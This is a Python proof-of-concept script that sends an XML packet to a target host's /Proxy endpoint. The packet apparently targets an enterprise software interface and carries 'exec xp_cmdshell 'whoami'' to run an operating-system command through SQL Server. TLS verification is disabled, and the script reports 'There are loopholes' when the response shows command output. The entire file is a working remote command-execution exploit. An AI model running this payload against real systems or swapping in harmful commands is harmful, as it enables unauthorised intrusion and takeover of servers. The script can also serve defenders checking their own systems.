import requests
import click

requests.packages.urllib3.disable_warnings()

@click.command()
@click.option('-h', '--host', help='Destination address')
def poc(host):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
    }
    data = {
        "cVer": "9.8.0",
        "dp": """<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec xp_cmdshell 'whoami'</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>"""
    }
    url = "https://" + host + "/Proxy"
    print(url)
    try:
        res = requests.post(url = url, headers=headers, data = data, timeout = 3, verify = False)
        if "system" in res.text:
            print("There are loopholes")
        else:
            print("The vulnerability does not exist")
    except:
        pass

def main():
    poc()

if __name__ == '__main__':
    main()




